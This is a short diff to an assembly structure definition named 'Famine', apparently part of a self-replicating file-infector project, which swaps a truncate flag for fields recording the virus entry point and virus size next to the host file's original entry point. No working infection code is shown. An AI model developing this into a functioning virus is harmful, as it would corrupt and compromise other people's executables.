@@ -85,7 +85,8 @@ struc Famine
     .file_original_len  resd    1
     .mmap_ptr           resq    1
     .original_entry     resq    1
-    .truncate_flag      resb    1
+    .virus_entry        resq    1
+    .virus_size         resq    1
 endstruc
 
 
